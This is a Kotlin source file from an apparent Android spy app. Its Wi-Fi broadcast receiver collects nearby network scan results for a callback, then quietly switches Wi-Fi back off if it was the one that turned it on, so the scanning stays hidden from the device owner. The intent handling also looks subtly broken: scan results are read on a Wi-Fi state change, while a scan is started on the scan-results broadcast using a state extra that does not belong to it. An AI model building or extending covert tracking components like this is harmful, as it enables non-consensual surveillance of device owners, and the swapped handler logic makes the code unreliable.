package com.komnacki.androidspyapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.wifi.WifiManager
import android.net.wifi.WifiManager.*
import android.util.Log
import com.komnacki.androidspyapp.MessageUtils
import com.komnacki.androidspyapp.WifiScanResult

class WifiScanReceiver(
    private val mWifiManager: WifiManager,
    private val onResultsReceived: (items: List<WifiScanResult>) -> Unit
) : BroadcastReceiver() {

    var state: MessageUtils.StateChange = MessageUtils.StateChange.NOT_CHANGE

    override fun onReceive(context: Context?, intent: Intent?) {
        Log.i("KK: ", "Wifi scan on receive")

        intent?.let {
            when (intent.action) {
                WIFI_STATE_CHANGED_ACTION -> {
                    context?.let {
                        it.unregisterReceiver(this)

                        val results = mutableListOf<WifiScanResult>()
                        mWifiManager.scanResults.forEach { item ->
                            results.add(WifiScanResult(it, item))
                        }
                        onResultsReceived.invoke(results)

                        if (state == MessageUtils.StateChange.CHANGE_TO_ENABLED) {
                            mWifiManager.isWifiEnabled = false
                        }
                    }
                }
                SCAN_RESULTS_AVAILABLE_ACTION -> {
                    if (intent.getIntExtra(EXTRA_WIFI_STATE, WIFI_STATE_UNKNOWN) == WIFI_STATE_ENABLED) {
                        mWifiManager.startScan()
                    } else {
                        /* no action */
                    }
                }
                else -> { /* no action */ }
            }
        }
    }
}